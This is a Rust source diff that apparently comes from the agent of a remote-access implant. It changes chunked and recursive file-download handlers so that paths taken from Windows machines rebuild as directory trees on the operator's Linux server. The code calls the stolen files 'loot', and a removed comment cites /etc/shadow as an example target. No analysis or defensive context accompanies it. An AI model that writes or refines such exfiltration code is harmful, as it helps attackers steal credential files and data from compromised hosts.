@@ -124,13 +124,12 @@ pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_i
             .map(|n| n.to_string_lossy().to_string())
             .unwrap_or_else(|| "loot".to_string());
 
-        // rel_path strips the leading separator so save_file_chunk can
-        // reconstruct the full directory tree under the batch folder.
-        // E.g. /etc/shadow → batch_dir/etc/shadow
+        // rel_path strips leading separators and normalizes backslashes so
+        // the Linux server reconstructs the directory tree correctly.
         let rel_path = path
             .trim_start_matches('/')
             .trim_start_matches('\\')
-            .to_string();
+            .replace('\\', "/");
 
         // Stat first so we can report size and compute total_chunks.
         let file_size: u64 = match std::fs::metadata(&path) {
@@ -237,7 +236,15 @@ pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: 
 
         // Strip the agent-side parent prefix so rel_path is relative to the
         // root folder rather than the full OS path.
-        let root_prefix = std::path::Path::new(&root_path)
+        //
+        // IMPORTANT: normalize all separators to forward-slash BEFORE string
+        // comparison.  On Windows, path_str uses backslashes; the server runs
+        // on Linux where backslash is a legal filename character.  Without this
+        // normalization the prefix never matches and the full absolute path is
+        // sent as rel_path, which the Linux server saves as a single file with
+        // backslashes in its name rather than as a directory tree.
+        let root_path_fwd  = root_path.replace('\\', "/");
+        let root_prefix = std::path::Path::new(&root_path_fwd)
             .parent()
             .map(|p| format!("{}/", p.to_string_lossy()))
             .unwrap_or_default();
@@ -248,7 +255,7 @@ pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: 
         };
 
         for path in files {
-            let path_str = path.to_string_lossy().to_string();
+            let path_str = path.to_string_lossy().replace('\\', "/");
             let rel_path = if path_str.starts_with(&root_prefix) {
                 path_str[root_prefix.len()..].to_string()
             } else {
